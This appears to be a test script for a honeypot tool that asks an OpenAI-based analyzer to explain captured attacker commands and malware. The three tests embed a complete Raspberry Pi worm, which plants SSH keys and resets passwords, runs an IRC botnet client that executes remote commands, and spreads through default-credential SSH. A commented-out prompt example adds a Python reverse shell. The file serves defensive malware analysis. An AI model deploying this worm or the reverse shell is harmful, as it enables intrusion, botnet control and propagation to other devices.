TBxkRntvhxAYm3d4WGcOPDcKZUd8d5UQGZtwcEV7DTgjBG1MfnGEERKVeHxYZw89Iw5mRGZ3jxcRhHV6VmYSPD0Ne0d9dZsYFI93eEdlBC08DmBYf3ibEBGDb3lCbwo9PA9lVnl3gQ8Yh29/TnsNOjUGY0Z5c40BEIFwZkdhBCM8CWRYcHuDERCFcmhOYBI8NAR7T2ZwhBQbg3F5RmMcNSMNZkZmdIAPFYR7fkZkDT4tDWRPZniDDxCFcWZHbA83OwxkQnFhhBkUm3N8Q3sIPCMOZURyd4UQEIdhekdsEjw5CXtHe3KbFBCPd3hHZgstPAVmWHlwhw8Vh295RW8KPTwPbVZ5cYMPEIFvekJtEjw9BmNGeXWGARSMb3lHZRI/PhJnRH57gxEQgXhoRWMSOiMNYkdmc4QbF4Vwe0F1DTUjDmdHZnCDFA+EeXxMYww8OQx1Qn9vjBUPhHVmR2QNNzsMZEd/YYEUD4d1cFhkDCM/DmRMfnGEERCVcHBEewo8Iw5iWH13jxcRhHB8VmQNPCMOZ09mcoUPE4F3ckBlDT87HGRYeXCCDxiGb3pCZwY7PQ1nTmhwhRcPgHJmQWcSNDgGY0Z5cIMBEIR5ZkVkEjw8CntEfXOPFxGEcHpWYQ4jPAVnWHpxjQ8ThHhyQGUNPD4cZE57b4cVF5twcE97Cz83CmVHeHCVEBiFb35Hew85Iw1jQ3J3hRASgWF5RmYSPDgPe0dwdZsTFY93eEdnDi08DGRYenGFDxSMb3lDYQY7PQ1nT2hyjA8QhXBmR2MOIzwFbEx+cYQSGMBUyjosBY0HJjhEZEyfaM3RwQ==', 
            'cp /tmp/X23ZoPo761 /tmp/linux',
            'head -c 0 > /tmp/windows',
            'head -c 0 > /tmp/windows_sign',
            'head -c 0 > /tmp/arm_linux',
            'head -c 0 > /tmp/mips_linux',
            'head -c 0 > /tmp/mips_linux_sign',
            'head -c 0 > /tmp/winminer',
            'head -c 0 > /tmp/arm_linux_sign',
            'head -c 0 > /tmp/winminer_sign',
            'head -c 0 > /tmp/miner_sign',
            'head -c 0 > /tmp/miner',
            'head -c 0 > /tmp/mipsel_linux',
            'head -c 0 > /tmp/mipsel_linux_sign',
            'head -c 0 > /tmp/linux_sign',
            'exit'
        ]
    
    result = analyzer.explain_commands(cmds)
    print(result)


def test_explain_malware(analyzer):
    malware_source_code = 'C0755 4745 X\n#!/bin/bash\n\nMYSELF=`realpath $0`\nDEBUG=/dev/null\necho $MYSELF >> $DEBUG\n\nif [ "$EUID" -ne 0 ]\nthen \n\tNEWMYSELF=`mktemp -u \'XXXXXXXX\'`\n\tsudo cp $MYSELF /opt/$NEWMYSELF\n\tsudo sh -c "echo \'#!/bin/sh -e\' > /etc/rc.local"\n\tsudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"\n\tsudo sh -c "echo \'exit 0\' >> /etc/rc.local"\n\tsleep 1\n\tsudo reboot\nelse\nTMP1=`mktemp`\necho $TMP1 >> $DEBUG\n\nkillall bins.sh\nkillall minerd\nkillall node\nkillall nodejs\nkillall ktx-armv4l\nkillall ktx-i586\nkillall ktx-m68k\nkillall ktx-mips\nkillall ktx-mipsel\nkillall ktx-powerpc\nkillall ktx-sh4\nkillall ktx-sparc\nkillall arm5\nkillall zmap\nkillall kaiten\nkillall perl\n\necho "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts\nrm -rf /root/.bashrc\nrm -rf /home/pi/.bashrc\n\nusermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi\n\nmkdir -p /root/.ssh\necho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys\n\necho "nameserver 8.8.8.8" >> /etc/resolv.conf\nrm -rf /tmp/ktx*\nrm -rf /tmp/cpuminer-multi\nrm -rf /var/tmp/kaiten\n\ncat > /tmp/public.pem <<EOFMARKER\n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs\nglv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW\nrXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF\nWRq+Z8HYMvPlgSRA3wIDAQAB\n-----END PUBLIC KEY-----\nEOFMARKER\n\nBOT=`mktemp -u \'XXXXXXXX\'`\n\ncat > /tmp/$BOT <<\'EOFMARKER\'\n#!/bin/bash\n\nSYS=`uname -a | md5sum | awk -F\' \' \'{print $1}\'`\nNICK=a${SYS:24}\nwhile [ true ]; do\n\n\tarr[0]="ix1.undernet.org"\n\tarr[1]="ix2.undernet.org"\n\tarr[2]="Ashburn.Va.Us.UnderNet.org"\n\tarr[3]="Bucharest.RO.EU.Undernet.Org"\n\tarr[4]="Budapest.HU.EU.UnderNet.org"\n\tarr[5]="Chicago.IL.US.Undernet.org"\n\trand=$[$RANDOM % 6]\n\tsvr=${arr[$rand]}\n\n\teval \'exec 3<>/dev/tcp/$svr/6667;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\n\techo $NICK\n\n\teval \'printf "NICK $NICK\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\teval \'printf "USER user 8 * :IRC hi\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\tcontinue\n\tfi\n\n\t# Main loop\n\twhile [ true ]; do\n\t\teval "read msg_in <&3;"\n\n\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tbreak\n\t\tfi\n\n\t\tif  [[ "$msg_in" =~ "PING" ]] ; then\n\t\t\tprintf "PONG %s\\n" "${msg_in:5}";\n\t\t\teval \'printf "PONG %s\\r\\n" "${msg_in:5}" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsleep 1\n\t\t\teval \'printf "JOIN #biret\\r\\n" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\telif [[ "$msg_in" =~ "PRIVMSG" ]] ; then\n\t\t\tprivmsg_h=$(echo $msg_in| cut -d\':\' -f 3)\n\t\t\tprivmsg_data=$(echo $msg_in| cut -d\':\' -f 4)\n\t\t\tprivmsg_nick=$(echo $msg_in| cut -d\':\' -f 2 | cut -d\'!\' -f 1)\n\n\t\t\thash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\' \' \'{print $1}\'`\n\t\t\tsign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`\n\n\t\t\tif [[ "$sign" == "$hash" ]] ; then\n\t\t\t\tCMD=`echo $privmsg_data | base64 -d -i`\n\t\t\t\tRES=`bash -c "$CMD" | base64 -w 0`\n\t\t\t\teval \'printf "PRIVMSG $privmsg_nick :$RES\\r\\n" >&3;\'\n\t\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\tfi\n\tdone\ndone\nEOFMARKER\n\nchmod +x /tmp/$BOT\nnohup /tmp/$BOT 2>&1 > /tmp/bot.log &\nrm /tmp/nohup.log -rf\nrm -rf nohup.out\nsleep 3\nrm -rf /tmp/$BOT\n\nNAME=`mktemp -u \'XXXXXXXX\'`\n\ndate > /tmp/.s\n\napt-get update -y --force-yes\napt-get install zmap sshpass -y --force-yes\n\nwhile [ true ]; do\n\tFILE=`mktemp`\n\tzmap -p 22 -o $FILE -n 100000\n\tkillall ssh scp\n\tfor IP in `cat $FILE`\n\tdo\n\t\tsshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\t\tsshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\tdone\n\trm -rf $FILE\n\tsleep 10\ndone\n\nfi\n\n\n'
    cmds = ['scp -t /tmp/50kmIX7P', 'cd /tmp && chmod +x 50kmIX7P && bash -c ./50kmIX7P', './50kmIX7P']
    result = analyzer.explain_malware(malware_source_code, cmds)
    
    print(result)

def test_comment_malware(analyzer):
    malware_source_code = 'C0755 4745 X\n#!/bin/bash\n\nMYSELF=`realpath $0`\nDEBUG=/dev/null\necho $MYSELF >> $DEBUG\n\nif [ "$EUID" -ne 0 ]\nthen \n\tNEWMYSELF=`mktemp -u \'XXXXXXXX\'`\n\tsudo cp $MYSELF /opt/$NEWMYSELF\n\tsudo sh -c "echo \'#!/bin/sh -e\' > /etc/rc.local"\n\tsudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"\n\tsudo sh -c "echo \'exit 0\' >> /etc/rc.local"\n\tsleep 1\n\tsudo reboot\nelse\nTMP1=`mktemp`\necho $TMP1 >> $DEBUG\n\nkillall bins.sh\nkillall minerd\nkillall node\nkillall nodejs\nkillall ktx-armv4l\nkillall ktx-i586\nkillall ktx-m68k\nkillall ktx-mips\nkillall ktx-mipsel\nkillall ktx-powerpc\nkillall ktx-sh4\nkillall ktx-sparc\nkillall arm5\nkillall zmap\nkillall kaiten\nkillall perl\n\necho "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts\nrm -rf /root/.bashrc\nrm -rf /home/pi/.bashrc\n\nusermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi\n\nmkdir -p /root/.ssh\necho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys\n\necho "nameserver 8.8.8.8" >> /etc/resolv.conf\nrm -rf /tmp/ktx*\nrm -rf /tmp/cpuminer-multi\nrm -rf /var/tmp/kaiten\n\ncat > /tmp/public.pem <<EOFMARKER\n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs\nglv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW\nrXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF\nWRq+Z8HYMvPlgSRA3wIDAQAB\n-----END PUBLIC KEY-----\nEOFMARKER\n\nBOT=`mktemp -u \'XXXXXXXX\'`\n\ncat > /tmp/$BOT <<\'EOFMARKER\'\n#!/bin/bash\n\nSYS=`uname -a | md5sum | awk -F\' \' \'{print $1}\'`\nNICK=a${SYS:24}\nwhile [ true ]; do\n\n\tarr[0]="ix1.undernet.org"\n\tarr[1]="ix2.undernet.org"\n\tarr[2]="Ashburn.Va.Us.UnderNet.org"\n\tarr[3]="Bucharest.RO.EU.Undernet.Org"\n\tarr[4]="Budapest.HU.EU.UnderNet.org"\n\tarr[5]="Chicago.IL.US.Undernet.org"\n\trand=$[$RANDOM % 6]\n\tsvr=${arr[$rand]}\n\n\teval \'exec 3<>/dev/tcp/$svr/6667;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\n\techo $NICK\n\n\teval \'printf "NICK $NICK\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\teval \'printf "USER user 8 * :IRC hi\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\tcontinue\n\tfi\n\n\t# Main loop\n\twhile [ true ]; do\n\t\teval "read msg_in <&3;"\n\n\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tbreak\n\t\tfi\n\n\t\tif  [[ "$msg_in" =~ "PING" ]] ; then\n\t\t\tprintf "PONG %s\\n" "${msg_in:5}";\n\t\t\teval \'printf "PONG %s\\r\\n" "${msg_in:5}" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsleep 1\n\t\t\teval \'printf "JOIN #biret\\r\\n" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\telif [[ "$msg_in" =~ "PRIVMSG" ]] ; then\n\t\t\tprivmsg_h=$(echo $msg_in| cut -d\':\' -f 3)\n\t\t\tprivmsg_data=$(echo $msg_in| cut -d\':\' -f 4)\n\t\t\tprivmsg_nick=$(echo $msg_in| cut -d\':\' -f 2 | cut -d\'!\' -f 1)\n\n\t\t\thash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\' \' \'{print $1}\'`\n\t\t\tsign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`\n\n\t\t\tif [[ "$sign" == "$hash" ]] ; then\n\t\t\t\tCMD=`echo $privmsg_data | base64 -d -i`\n\t\t\t\tRES=`bash -c "$CMD" | base64 -w 0`\n\t\t\t\teval \'printf "PRIVMSG $privmsg_nick :$RES\\r\\n" >&3;\'\n\t\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\tfi\n\tdone\ndone\nEOFMARKER\n\nchmod +x /tmp/$BOT\nnohup /tmp/$BOT 2>&1 > /tmp/bot.log &\nrm /tmp/nohup.log -rf\nrm -rf nohup.out\nsleep 3\nrm -rf /tmp/$BOT\n\nNAME=`mktemp -u \'XXXXXXXX\'`\n\ndate > /tmp/.s\n\napt-get update -y --force-yes\napt-get install zmap sshpass -y --force-yes\n\nwhile [ true ]; do\n\tFILE=`mktemp`\n\tzmap -p 22 -o $FILE -n 100000\n\tkillall ssh scp\n\tfor IP in `cat $FILE`\n\tdo\n\t\tsshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\t\tsshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\tdone\n\trm -rf $FILE\n\tsleep 10\ndone\n\nfi\n\n\n'
    cmds = ['scp -t /tmp/50kmIX7P', 'cd /tmp && chmod +x 50kmIX7P && bash -c ./50kmIX7P', './50kmIX7P']
    result = analyzer.comment_malware(malware_source_code, cmds)
    
    print(result)

def test_answer_questions(analyzer):
    malware_source_code = 'C0755 4745 X\n#!/bin/bash\n\nMYSELF=`realpath $0`\nDEBUG=/dev/null\necho $MYSELF >> $DEBUG\n\nif [ "$EUID" -ne 0 ]\nthen \n\tNEWMYSELF=`mktemp -u \'XXXXXXXX\'`\n\tsudo cp $MYSELF /opt/$NEWMYSELF\n\tsudo sh -c "echo \'#!/bin/sh -e\' > /etc/rc.local"\n\tsudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"\n\tsudo sh -c "echo \'exit 0\' >> /etc/rc.local"\n\tsleep 1\n\tsudo reboot\nelse\nTMP1=`mktemp`\necho $TMP1 >> $DEBUG\n\nkillall bins.sh\nkillall minerd\nkillall node\nkillall nodejs\nkillall ktx-armv4l\nkillall ktx-i586\nkillall ktx-m68k\nkillall ktx-mips\nkillall ktx-mipsel\nkillall ktx-powerpc\nkillall ktx-sh4\nkillall ktx-sparc\nkillall arm5\nkillall zmap\nkillall kaiten\nkillall perl\n\necho "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts\nrm -rf /root/.bashrc\nrm -rf /home/pi/.bashrc\n\nusermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi\n\nmkdir -p /root/.ssh\necho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys\n\necho "nameserver 8.8.8.8" >> /etc/resolv.conf\nrm -rf /tmp/ktx*\nrm -rf /tmp/cpuminer-multi\nrm -rf /var/tmp/kaiten\n\ncat > /tmp/public.pem <<EOFMARKER\n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs\nglv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW\nrXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF\nWRq+Z8HYMvPlgSRA3wIDAQAB\n-----END PUBLIC KEY-----\nEOFMARKER\n\nBOT=`mktemp -u \'XXXXXXXX\'`\n\ncat > /tmp/$BOT <<\'EOFMARKER\'\n#!/bin/bash\n\nSYS=`uname -a | md5sum | awk -F\' \' \'{print $1}\'`\nNICK=a${SYS:24}\nwhile [ true ]; do\n\n\tarr[0]="ix1.undernet.org"\n\tarr[1]="ix2.undernet.org"\n\tarr[2]="Ashburn.Va.Us.UnderNet.org"\n\tarr[3]="Bucharest.RO.EU.Undernet.Org"\n\tarr[4]="Budapest.HU.EU.UnderNet.org"\n\tarr[5]="Chicago.IL.US.Undernet.org"\n\trand=$[$RANDOM % 6]\n\tsvr=${arr[$rand]}\n\n\teval \'exec 3<>/dev/tcp/$svr/6667;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\n\techo $NICK\n\n\teval \'printf "NICK $NICK\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\teval \'printf "USER user 8 * :IRC hi\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\tcontinue\n\tfi\n\n\t# Main loop\n\twhile [ true ]; do\n\t\teval "read msg_in <&3;"\n\n\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tbreak\n\t\tfi\n\n\t\tif  [[ "$msg_in" =~ "PING" ]] ; then\n\t\t\tprintf "PONG %s\\n" "${msg_in:5}";\n\t\t\teval \'printf "PONG %s\\r\\n" "${msg_in:5}" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsleep 1\n\t\t\teval \'printf "JOIN #biret\\r\\n" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\telif [[ "$msg_in" =~ "PRIVMSG" ]] ; then\n\t\t\tprivmsg_h=$(echo $msg_in| cut -d\':\' -f 3)\n\t\t\tprivmsg_data=$(echo $msg_in| cut -d\':\' -f 4)\n\t\t\tprivmsg_nick=$(echo $msg_in| cut -d\':\' -f 2 | cut -d\'!\' -f 1)\n\n\t\t\thash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\' \' \'{print $1}\'`\n\t\t\tsign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`\n\n\t\t\tif [[ "$sign" == "$hash" ]] ; then\n\t\t\t\tCMD=`echo $privmsg_data | base64 -d -i`\n\t\t\t\tRES=`bash -c "$CMD" | base64 -w 0`\n\t\t\t\teval \'printf "PRIVMSG $privmsg_nick :$RES\\r\\n" >&3;\'\n\t\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\tfi\n\tdone\ndone\nEOFMARKER\n\nchmod +x /tmp/$BOT\nnohup /tmp/$BOT 2>&1 > /tmp/bot.log &\nrm /tmp/nohup.log -rf\nrm -rf nohup.out\nsleep 3\nrm -rf /tmp/$BOT\n\nNAME=`mktemp -u \'XXXXXXXX\'`\n\ndate > /tmp/.s\n\napt-get update -y --force-yes\napt-get install zmap sshpass -y --force-yes\n\nwhile [ true ]; do\n\tFILE=`mktemp`\n\tzmap -p 22 -o $FILE -n 100000\n\tkillall ssh scp\n\tfor IP in `cat $FILE`\n\tdo\n\t\tsshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\t\tsshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\tdone\n\trm -rf $FILE\n\tsleep 10\ndone\n\nfi\n\n\n'
    cmds = ['scp -t /tmp/50kmIX7P', 'cd /tmp && chmod +x 50kmIX7P && bash -c ./50kmIX7P', './50kmIX7P']
    result = analyzer.answer_attack_questions(questions=["What is the goal of this attack?",],
                                       commands=cmds,
                                       malware_source_code=malware_source_code)
    
    print(result)
    

if __name__ == "__main__":
    analyzer = OpenAIAnalyzer(OPENAI_API_KEY)
    
    #test_explain_commands(analyzer)
    #test_explain_malware(analyzer)
    #test_comment_malware(analyzer)
    test_answer_questions(analyzer)



























#     def explain_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
#         system_prompt = " ".join([
#         "Your role is to throughly explain and comment a piece of malware that was executed by an attacker on a Linux honeypot system.",
#         "Input will be provided as a json object with two keys: malware_source_code and commands.",
#         "Input will be structured in the following format: {malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
#         "malware_source_code will be a string containing the source code of the malware that you are to explain.",
#         "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
#         "Output must be a json object with three keys: malware_comments, malware_explanation, malware_language",
#         "Output must be in the following format {malware_comments: {insert_line_index: comment_string, ...}, malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}.",
#         "The commented_code value a json object with integer keys that are the line index in the source code where the comment should be added before and string values that are comments explaining each step of the malware execution.",
#         "The source code will be split into lines and the comments will be added before the line at insert_line_index.",
#         "The malware_explanation should explain the code and comments in the commented_code value in greater detail and what the attacker was trying to do with the malware.",
#         "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
#         ])

#         example_commands1 = ["wget http://example.com -O example.py", 
#                             "python3 example.py -s /bin/bash -l 100.100.101.101 -p 4444 &",
#                             "rm example.py"]

#         example_malware1 = """
# import socket
# import os
# import argparse
# import pty


# if __name__ == "__main__":
#     parser=argparse.ArgumentParser()
#     parser.add_argument('-s', '--shell',
#                         required=False,
#                         action='store',
#                         default="/bin/bash",
#                         help="The shell to spawn")
#     parser.add_argument('-l', '--host', 
#                         required=False, 
#                         action='store', 
#                         default="127.0.0.1", 
#                         help='The IP address to connect to')
#     parser.add_argument('-p', '--port',
#                         required=False,
#                         type=int, 
#                         default=6969, 
#                         help="A comma separated list of ports to try to connect to")
    
#     parser.add_argument('-f', '--family',
#                         required=False,
#                         default=socket.AF_INET,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket family to use")
#     parser.add_argument('-t', '--type',
#                         required=False,
#                         default=socket.SOCK_STREAM,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket type to use")
#     parser.add_argument('--protocol',
#                         required=False,
#                         default=-1,
#                         type=int,
#                         help="The socket protocol to use")
#     parser.add_argument('--fileno',
#                         required=False,
#                         default=None,
#                         type=int,
#                         help="The file descriptor to use")
    
#     args=parser.parse_args()

#     s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
#     s.connect((args.host, args.port))

#     os.dup2(s.fileno(),0)
#     os.dup2(s.fileno(),1)
#     os.dup2(s.fileno(),2)
    
#     pty.spawn(args.shell)
# """

#         commented_malware1 = """

# # This script is a python script that is used to spawn a shell on a remote system.

# # Import the socket, os, argparse, and pty modules.
# import socket
# import os
# import argparse
# import pty


# if __name__ == "__main__":
#     # Initialize the parser object.
#     parser=argparse.ArgumentParser()

#     # The shell argument is used to specify the shell to spawn on the remote system.
#     parser.add_argument('-s', '--shell',
#                         required=False,
#                         action='store',
#                         default="/bin/bash",
#                         help="The shell to spawn")
    
#     # The host argument is used to specify the IP address of the remote system.
#     parser.add_argument('-l', '--host', 
#                         required=False, 
#                         action='store', 
#                         default="127.0.0.1", 
#                         help='The IP address to connect to')

#     # The port argument is used to specify the port to connect to on the remote system. 
#     parser.add_argument('-p', '--port',
#                         required=False,
#                         type=int, 
#                         default=6969, 
#                         help="A comma separated list of ports to try to connect to")
    
#     # The family argument is used to specify the socket family to use. The default is AF_INET.
#     parser.add_argument('-f', '--family',
#                         required=False,
#                         default=socket.AF_INET,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket family to use")

#     # The type argument is used to specify the socket type to use. The default is SOCK_STREAM.
#     parser.add_argument('-t', '--type',
#                         required=False,
#                         default=socket.SOCK_STREAM,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket type to use")

#     # The protocol argument is used to specify the socket protocol to use. The default is -1.
#     parser.add_argument('--protocol',
#                         required=False,
#                         default=-1,
#                         type=int,
#                         help="The socket protocol to use")

#     # The fileno argument is used to specify the file descriptor to use. The default is None.
#     parser.add_argument('--fileno',
#                         required=False,
#                         default=None,
#                         type=int,
#                         help="The file descriptor to use")
    
#     # Parse the arguments.
#     args=parser.parse_args()

#     # Create a socket object using the specified socket family, type, protocol, and file descriptor.
#     s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)

#     # Connect to the remote system using the specified IP address and port.
#     s.connect((args.host, args.port))

